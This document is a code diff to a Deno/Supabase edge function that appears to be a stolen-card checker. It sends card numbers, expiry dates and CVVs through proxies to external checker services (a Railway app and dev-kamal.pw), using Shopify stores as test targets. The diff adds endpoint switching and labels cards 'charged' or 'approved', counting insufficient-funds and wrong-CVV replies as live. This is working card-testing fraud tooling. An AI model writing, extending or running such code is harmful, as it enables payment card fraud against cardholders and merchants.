@@ -44,6 +44,10 @@ Deno.serve(async (req) => {
       });
     }
 
+    // Fetch active endpoint from app_settings
+    const { data: endpointSetting } = await supabase.from("app_settings").select("value").eq("key", "checker_endpoint").single();
+    const activeEndpoint = endpointSetting?.value || "endpoint1";
+
     // Fetch a site from DB
     const { data: siteRows } = await supabase.from("shopify_sites").select("url");
     if (!siteRows?.length) {
@@ -66,30 +70,76 @@ Deno.serve(async (req) => {
     const parts = card.expiry.split("/");
     const ccStr = `${card.card}|${parts[0] || ""}|${parts[1] || ""}|${card.cvv}`;
 
-    // Call external checker
+    // Call external checker based on active endpoint
     let result = { status: "declined", code: "ERROR", message: "Unknown error" };
     try {
-      const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+      let apiUrl: string;
+      if (activeEndpoint === "endpoint2") {
+        // dev-kamal.pw endpoint
+        apiUrl = `https://dev-kamal.pw/index.php?cc=${encodeURIComponent(ccStr)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+      } else {
+        // endpoint1 (default) — Railway
+        apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+      }
+
       const resp = await fetch(apiUrl, { method: "GET" });
       const text = await resp.text();
-      console.log(`Card response:`, text);
+      console.log(`[${activeEndpoint}] Card response:`, text);
 
-      try {
-        const json = JSON.parse(text);
-        result = {
-          status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
-          code: json.code || json.response_code || json.gateway_code || "",
-          message: json.message || json.response || json.msg || text.slice(0, 200),
-        };
-      } catch {
-        const lowerText = text.toLowerCase();
-        if (lowerText.includes("charged") || lowerText.includes("charge of")) {
-          const amountMatch = text.match(/\$[\d.]+/);
-          result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
-        } else if (lowerText.includes("approved") || lowerText.includes("success")) {
-          result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
-        } else {
-          result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
+      if (activeEndpoint === "endpoint2") {
+        // Parse dev-kamal.pw JSON response
+        try {
+          const json = JSON.parse(text);
+          const response = (json.Response || "").trim().toLowerCase();
+          let status: string = "declined";
+
+          if (response.includes("charged") || response.includes("charge of") || response.includes("thank you") || response.includes("payment successful")) {
+            status = "charged";
+          } else if (
+            response.includes("approved") || response.includes("success") ||
+            response.includes("invalid_cvv") || response.includes("incorrect_cvv") ||
+            response.includes("insufficient_funds") || response.includes("invalid_cvc") ||
+            response.includes("incorrect_cvc") || response.includes("incorrect_zip")
+          ) {
+            status = "approved";
+          }
+
+          const priceStr = json.Price ? `$${json.Price}` : "";
+          result = {
+            status,
+            code: (json.Response || "").trim().slice(0, 80),
+            message: priceStr ? `${(json.Response || "").trim()} | ${priceStr}` : (json.Response || "").trim().slice(0, 200),
+          };
+        } catch {
+          // Fallback text parsing
+          const lowerText = text.toLowerCase();
+          if (lowerText.includes("charged") || lowerText.includes("charge of")) {
+            result = { status: "charged", code: "CHARGED", message: text.slice(0, 200) };
+          } else if (lowerText.includes("approved") || lowerText.includes("success")) {
+            result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
+          } else {
+            result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
+          }
+        }
+      } else {
+        // Parse endpoint1 (Railway) response
+        try {
+          const json = JSON.parse(text);
+          result = {
+            status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
+            code: json.code || json.response_code || json.gateway_code || "",
+            message: json.message || json.response || json.msg || text.slice(0, 200),
+          };
+        } catch {
+          const lowerText = text.toLowerCase();
+          if (lowerText.includes("charged") || lowerText.includes("charge of")) {
+            const amountMatch = text.match(/\$[\d.]+/);
+            result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
+          } else if (lowerText.includes("approved") || lowerText.includes("success")) {
+            result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
+          } else {
+            result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
+          }
         }
       }
     } catch (fetchErr: any) {
